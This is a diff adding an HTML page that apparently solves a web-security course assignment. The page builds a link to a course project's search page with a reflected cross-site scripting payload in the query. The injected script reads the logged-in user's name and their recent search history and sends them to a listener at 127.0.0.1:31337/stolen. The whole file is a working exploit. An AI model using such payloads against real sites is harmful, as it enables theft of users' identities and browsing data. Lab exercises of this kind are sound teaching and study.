@@ -1,0 +1,20 @@
+<!DOCTYPE html>
+<html>
+<meta charset="utf-8">
+<head>
+<script src="https://code.jquery.com/jquery-2.2.4.js"></script>
+</head>
+<body>
+	<div><a id="first1">XSS1</a></div>
+</body>
+<script>
+	$(document).ready(function(){
+		var initialPart = "http://www.ecen5032.org/project2/search?"; 
+
+		var code = "$( document ).ready(function() {var usr=document.getElementById('logged-in-user').innerText;var hstry = $('#history-list').children().eq(1).html();window.open('http://127.0.0.1:31337/stolen?user=' + usr + '&last_search=' + hstry); });";
+		var iam = encodeURIComponent(code);
+		var first1_lnk = initialPart + "xssdefense=0&q="+ "%3Cscript%3E" + iam + "%3C%2Fscript%3E"; 
+$("#first1").attr("href", first1_lnk);
+	});
+</script>
+</html> 
